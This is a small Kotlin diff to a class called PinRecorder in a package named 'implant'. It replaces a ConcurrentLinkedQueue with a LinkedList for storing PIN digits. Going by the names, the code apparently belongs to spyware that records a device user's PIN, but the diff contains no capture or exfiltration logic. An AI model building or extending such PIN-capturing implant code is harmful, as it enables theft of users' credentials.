@@ -9,7 +9,6 @@
 package com.cooperthecoder.implant
 
 import java.util.*
-import java.util.concurrent.ConcurrentLinkedQueue
 
 class PinRecorder(val callback: (String) -> Unit) {
 
@@ -30,7 +29,7 @@ class PinRecorder(val callback: (String) -> Unit) {
         const val EMERGENCY = "[Emergency]"
     }
 
-    private val digitQueue: Queue<String> = ConcurrentLinkedQueue<String>()
+    private val digitQueue: Queue<String> = LinkedList<String>()
 
     fun appendPinDigit(digit: String) {
         when (digit) {
